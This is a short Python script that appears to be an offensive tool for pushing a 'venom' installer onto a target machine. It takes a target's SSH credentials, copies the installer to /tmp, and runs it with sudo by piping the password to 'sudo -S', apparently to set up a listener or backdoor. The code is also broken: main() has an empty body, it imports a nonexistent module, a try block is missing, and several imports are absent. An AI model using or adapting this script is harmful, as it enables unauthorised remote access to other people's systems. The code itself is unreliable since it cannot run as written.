#!/usr/bin/env python3
import os
import socket
import file
import paramiko
def main():
    
def install(address):
    f = file.open("/etc/venomClient", "r")
    fileCont = f.read()
    fileEncode = hex(fileCont)
    user = input("Enter target username: ")
    password = input(f"Enter password for {user}: ")
    
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_client.connect(address, username=user, password=password)
    
    scp_command = f'scp /etc/venomInstaller {user}@{address}:/tmp/no'
    subprocess.run(scp_command, shell=True, check=True)
    print(f"Listener script copied over to {address}")
            
    command = f"bash /tmp/no {fileEncode}"
    stdin, stdout, stderr = ssh_client.exec_command(f"echo {password} | sudo -S {command}")
    error = stderr.read().decode('utf-8')
    if(len(error) > 0):
        print(f"An error occured: {error}")
    time.sleep(1)
    except Exception as e:
        print(f"An error occurred: {str(e)}")
main()